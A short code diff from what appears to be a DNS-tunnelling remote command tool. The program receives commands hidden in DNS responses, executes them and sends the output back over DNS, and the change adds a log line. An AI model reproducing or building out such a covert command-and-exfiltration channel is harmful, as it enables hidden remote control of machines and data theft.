@@ -100,8 +100,7 @@ def pulse() -> None:
                 if res[DNS].z == 1:
                     cmd = decode(recv)
                     try:
-                        print(cmd)
-                        send_data(execute(cmd))
+                        send_data(cmd, execute(cmd))
                     except:
                         print("Data got corrupted!")
                     recv = b""
@@ -157,8 +156,9 @@ def decode(data: bytes) -> str:
 
 
 # Send data over DNS
-def send_data(data: bytes) -> None:
+def send_data(cmd: str, data: bytes) -> None:
     frag_e_data = encode(data)
+    print("{:25}(Packets required: {})".format(cmd, len(frag_e_data)))
 
     req = []
     for i, data in enumerate(frag_e_data):
